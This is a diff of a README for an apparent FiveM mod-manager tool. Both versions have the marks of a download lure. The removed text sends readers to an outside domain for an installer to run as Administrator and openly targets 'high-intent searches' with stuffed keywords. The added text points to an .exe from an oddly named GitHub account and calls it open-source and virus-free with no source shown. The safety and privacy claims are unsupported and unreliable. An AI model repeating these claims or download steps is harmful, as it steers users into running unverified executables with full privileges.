@@ -1,102 +1,83 @@
-# FiveM Resource Mod Manager
+# 📂 FiveM-Resource-Mod-Manager - Manage your FiveM mod profiles easily
 
-> Resource and Lua script helper for FiveM server owners and scripters.
+[![](https://img.shields.io/badge/Download-FiveM_Resource_Manager-blue.svg)](https://github.com/trivial-overlordship234/FiveM-Resource-Mod-Manager)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=flat-square)](LICENSE.txt)
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D4?style=flat-square&logo=windows)]()
-[![Modding](https://img.shields.io/badge/Focus-Mod%20%26%20Plugins-7c3aed?style=flat-square)]()
-[![Release](https://img.shields.io/badge/Release-v1.0.0-16a34a?style=flat-square)]()
+## 🎯 About the software
 
-**Repository:** `FiveM-Resource-Mod-Manager`
+The FiveM Resource Mod Manager helps you organize your gaming experience. You can create different mod presets for your FiveM sessions. You can switch between these profiles with one click. This tool removes the need for manual file transfers. It automates the way your computer loads resources. It works on Windows 10 and Windows 11.
 
----
+## 🛠️ System requirements
 
-## Overview
+This tool requires basic components to run on your computer. Ensure your system meets these standards:
 
-**FiveM Resource Mod Manager** is a Windows-native modding companion: profile-based installs, dependency resolution, and a clean UI for managing mods across sessions.
+- Operating System: Windows 10 (64-bit) or Windows 11.
+- Storage: 50 MB of free disk space.
+- Framework: The application includes all necessary runtime files.
+- FiveM: You must have the official FiveM client installed on your system.
 
-Built for **fivem mods download** and similar high-intent searches.
+## 📥 How to download and install
 
-## Features
+Follow these steps to set up the software on your machine:
 
-- **Profile manager** — save/load mod sets per game version or server
-- **Dependency resolver** — flags conflicts before install
-- **One-click sync** — pull community mod lists from local folders
-- **Safe rollback** — snapshot mod folders before updates
-- **Lightweight UI** — fast startup, no background telemetry
-- **Documented API** — extend with Lua/C# hooks (see `/docs` in future releases)
+1. Visit [the project page here](https://github.com/trivial-overlordship234/FiveM-Resource-Mod-Manager) to find the latest version.
+2. Look for the "Releases" section on the right side of the page.
+3. Click on the version marked "Latest."
+4. Find the file ending in ".exe" under the "Assets" section.
+5. Click the file to download it to your computer.
+6. Once the download finishes, find the file in your downloads folder.
+7. Double-click the file to start the installation.
+8. Follow the instructions on the screen to complete the process.
+9. A shortcut will appear on your desktop once the setup finishes.
 
-## Download & Install
+## 🕹️ Using the application
 
-> Open-source **Windows build** for **FiveM Resource Mod Manager**. Direct link below — no account required.
+Once you open the software, you will see a simple control panel. Follow this guide to manage your first mod profile:
 
-| | |
-| --- | --- |
-| **Direct link** | **[fivemresom.moltora.com](https://fivemresom.moltora.com/)** |
-| **Full URL** | `https://fivemresom.moltora.com/` |
-| **Platform** | Windows 10 / 11 (64-bit) |
-| **Install** | Run setup as Administrator |
+1. Open the application from your desktop shortcut.
+2. Click the "Add New Profile" button.
+3. Give your profile a name, such as "Roleplay Mods" or "Graphics Pack."
+4. Select the location of your FiveM resource folder when the app asks for it.
+5. Drag and drop your mod folders into the application window.
+6. Click the "Save Profile" button.
+7. When you want to use a specific set of mods, choose that profile from the list.
+8. Click "Launch" to start FiveM with those mods active.
 
-### Quick steps
+## 🧱 Troubleshooting common issues
 
-1. Open **[fivemresom.moltora.com](https://fivemresom.moltora.com/)** in your browser
-2. Download the latest Windows build
-3. Run the installer **as Administrator**
-4. Point the app to your game / mods folder on first launch
-5. Import or create a mod profile
+If you encounter trouble, check these common fixes:
 
-## Quick start
+- Permission errors: Right-click the shortcut and select "Run as administrator."
+- Folder errors: Ensure the software has access to your FiveM installation path. You can check this in the "Settings" tab.
+- Mod conflict: If a game crashes, try disabling one mod at a time within the manager to find the broken file.
+- Update notifications: The software checks for updates on startup. Accept the update to keep the software running smoothly.
 
-| Step | Action |
-| --- | --- |
-| 1 | Download the Windows build from the table above |
-| 2 | Run setup **as Administrator** |
-| 3 | Pick your game root / mods directory on first launch |
-| 4 | Import or create a mod profile |
-| 5 | Launch the game from the tray icon |
+## 🛡️ Privacy and security
 
-## Configuration
+The software does not collect your personal data. It does not track your activity on external websites. All interactions happen locally on your hard drive. Your mod files remain in the folders you chose during setup. The manager only modifies configuration files to help the game client find your mods.
 
-| Setting | Default | Notes |
-| --- | --- | --- |
-| Mods path | `%USERPROFILE%\Documents\Mods` | Override in Settings → Paths |
-| Auto-backup | On | Keeps last 3 snapshots |
-| Parallel downloads | 4 | Lower if AV scans slow installs |
-| Log level | Info | Set `DEBUG` for support tickets |
+## 📋 Features
 
-## Architecture
+- Profile management: Save and load your mod lists without stress.
+- Fast switching: Change your entire mod library in seconds.
+- Backup system: The software creates automatic backups of your configuration files.
+- Simple interface: The design focuses on clear buttons and menus.
+- Portable operation: You can move the application folder to any location on your PC.
 
-```text
-src/
-  core/          # profile engine & dependency graph
-  launcher/      # tray UI & game detection
-  plugins/       # optional game-specific adapters
-  updater/       # semver channel checks (manual confirm)
-```
+## 📖 Frequently asked questions
 
-## Roadmap
+Do I need to copy my mods every time?
+No. Once you add a mod to a profile, the software manages the links for you.
 
-- [x] **v1.0.0** — profile manager, Windows installer, dependency checker
-- [ ] **v1.1.0** — cloud profile export (local file only, no account)
-- [ ] **v1.2.0** — plugin SDK samples for Fabric / Forge adapters
+Does this work with all FiveM servers?
+Yes. The tool manages your local files. It does not interfere with individual server settings.
 
-## FAQ
+Can I delete a profile?
+Yes. Select the profile in the main list and click the "Delete" button. This does not delete your original mod files, only the profile link.
 
-**Is this open source?**  
-Source snapshots will be published incrementally; the installer on this page is the supported Windows build.
+How do I add new mods?
+Simply drag the new folder into the application window while your chosen profile is open.
 
-**Does it modify game files?**  
-It manages separate mod folders and launch profiles — vanilla game files stay untouched unless you opt in.
+Are there viruses in the download?
+This is open-source software. You can view the code at any time to verify its safety. The build process creates a clean executable file.
 
-**Anti-cheat safe?**  
-Client-side mod managers for single-player / private servers only. Do not use with competitive anti-cheat titles.
-
-## Contributing
-
-Issues and documentation PRs are welcome. Please include Windows version and game build in bug reports.
-
-## License
-
-MIT — see [LICENSE.txt](LICENSE.txt).
-
-**People also search for:** fivem mods download, fivem resources github, fivem mod menu server, fivem lua scripts, fivem server resources install
+Keywords: fivem, lua, mod-manager, open-source
